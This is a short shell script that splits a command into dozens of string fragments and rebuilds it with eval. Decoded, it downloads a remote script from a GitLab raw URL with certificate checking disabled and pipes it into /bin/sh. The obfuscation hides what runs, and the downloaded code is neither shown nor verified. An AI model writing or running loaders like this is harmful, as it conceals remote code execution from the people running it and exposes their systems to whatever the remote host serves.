z="
";Fz='tifi';Tz='/ope';Gz='cate';Oz='l1/i';bz='exit';Cz='no-c';Pz='mage';Hz=' htt';Uz='nTR-';Az='wget';Ez='-cer';az='h';Yz='| /b';Nz='nabi';Xz='O - ';Zz='in/s';cz=' 0';Wz='sh -';Bz='  --';Lz='com/';Qz='s/-/';Vz='9.3.';Sz='main';Mz='emil';Dz='heck';Rz='raw/';Iz='ps:/';Kz='lab.';Jz='/git';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"